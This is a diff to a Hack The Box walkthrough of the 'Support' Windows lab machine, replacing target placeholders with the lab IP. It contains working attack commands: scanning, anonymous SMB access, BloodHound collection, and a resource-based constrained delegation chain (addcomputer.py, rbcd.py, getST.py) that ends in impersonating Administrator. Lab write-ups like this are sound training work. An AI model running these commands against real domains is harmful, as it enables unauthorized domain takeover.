@@ -5,6 +5,7 @@
 | **Platform** | Hack The Box |
 | **OS** | Windows |
 | **Difficulty** | Easy |
+| **IP** | `10.129.230.181` |
 | **Domain** | `support.htb` / `dc.support.htb` |
 
 ## Synopsis
@@ -25,8 +26,8 @@ impersonate the Administrator and obtain a SYSTEM shell.
 ### Nmap
 
 ```bash
-nmap -p- --min-rate=5000 -T4 <target>
-nmap -p53,88,135,139,389,445,464,636,3268,5985 -sCV <target>
+nmap -p- --min-rate=5000 -T4 10.129.230.181
+nmap -p53,88,135,139,389,445,464,636,3268,5985 -sCV 10.129.230.181
 ```
 
 A standard Domain Controller footprint (DNS, Kerberos, LDAP, SMB, WinRM). Add
@@ -35,8 +36,8 @@ A standard Domain Controller footprint (DNS, Kerberos, LDAP, SMB, WinRM). Add
 ### SMB — anonymous share
 
 ```bash
-smbclient -L //<target>/ -N
-smbclient //<target>/support-tools -N
+smbclient -L //10.129.230.181/ -N
+smbclient //10.129.230.181/support-tools -N
 ```
 
 The `support-tools` share is readable anonymously and contains several utilities plus
@@ -94,7 +95,7 @@ The **user flag** is in `C:\Users\support\Desktop\user.txt`.
 Collect AD data with BloodHound:
 
 ```bash
-bloodhound-python -u support -p '<support-pass>' -d support.htb -ns <target> -c all
+bloodhound-python -u support -p '<support-pass>' -d support.htb -ns 10.129.230.181 -c all
 ```
 
 BloodHound shows **support → (member of) Shared Support Accounts → GenericAll → DC$**.
@@ -105,21 +106,21 @@ attack:
 
    ```bash
    addcomputer.py support.htb/support:'<support-pass>' -computer-name 'EVIL$' \
-     -computer-pass 'Evil123!' -dc-ip <target>
+     -computer-pass 'Evil123!' -dc-ip 10.129.230.181
    ```
 
 2. Set the DC's `msDS-AllowedToActOnBehalfOfOtherIdentity` to trust `EVIL$`:
 
    ```bash
    rbcd.py support.htb/support:'<support-pass>' -delegate-from 'EVIL$' \
-     -delegate-to 'DC$' -action write -dc-ip <target>
+     -delegate-to 'DC$' -action write -dc-ip 10.129.230.181
    ```
 
 3. Request a service ticket impersonating Administrator:
 
    ```bash
    getST.py support.htb/EVIL$:'Evil123!' -spn 'cifs/dc.support.htb' \
-     -impersonate Administrator -dc-ip <target>
+     -impersonate Administrator -dc-ip 10.129.230.181
    export KRB5CCNAME=Administrator.ccache
    ```
 
